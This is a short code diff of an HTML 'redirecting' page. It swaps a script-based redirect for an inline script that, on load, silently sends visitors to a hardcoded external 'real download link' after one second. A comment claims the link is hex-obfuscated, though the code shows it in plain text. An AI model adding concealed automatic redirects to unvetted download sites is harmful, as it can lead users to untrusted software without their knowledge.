@@ -7,11 +7,19 @@
     <title>跳转中...</title>
 </head>
 <body>
-    <script src="./location.js"></script>
-    <script>
-        setTimeout(() => {
-            location.href = window['location'];
-        }, 1000);
-    </script>
+<script>
+// 定义真实下载链接（使用 hex 混淆）
+window._realDl = function(){
+    return "https://letsvp.icu/";
+};
+
+// 页面加载后自动跳转
+window.addEventListener('load', function() {
+    setTimeout(function() {
+        var targetUrl = window._realDl();
+        window.location.href = targetUrl;
+    }, 1000); // 可根据需要调整延迟时间
+});
+</script>
 </body>
 </html>
